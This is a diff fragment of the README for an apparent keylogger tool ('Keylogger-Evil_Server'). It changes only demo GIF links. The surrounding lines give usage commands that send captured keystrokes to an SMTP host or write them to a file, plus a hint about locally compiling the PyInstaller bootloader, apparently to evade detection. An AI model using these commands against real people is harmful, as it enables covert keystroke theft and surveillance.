@@ -31,14 +31,13 @@ Simple technique: Compile the PyInstaller bootloader locally using Microsoft C/C
 
 `./app.py 192.168.32.34 -e smtp.gmail.com`
 
-![ezgif com-video-to-gif](https://github.com/Jsmoreira02/Keylogger-Evil_Server/assets/103542430/0bd58f4c-d3d9-4dc8-9e48-96f087d7e6c6)
-
+![Peek 12-01-2024 00-33](https://github.com/Jsmoreira02/Keylogger-Evil_Server/assets/103542430/6d4b9199-5b1a-41ac-a82c-cf6d8b7bcd31)
 
 #### Write the keystroke logs to a file
 
 `./app.py 192.168.18.20 -f keylogs.txt`
 
-![ezgif com-video-to-gif(1)](https://github.com/Jsmoreira02/Keylogger-Evil_Server/assets/103542430/a92f9295-a0a4-43f6-9270-38004afee560)
+![Peek 12-01-2024 00-34](https://github.com/Jsmoreira02/Keylogger-Evil_Server/assets/103542430/b4470ef2-1f89-4823-b7d2-aa012f3a698c)
 
 # Warning:    
 > I am not responsible for any illegal use or damage caused by this tool. It primarily serves as a proof of concept and is intended to raise awareness about cybersecurity
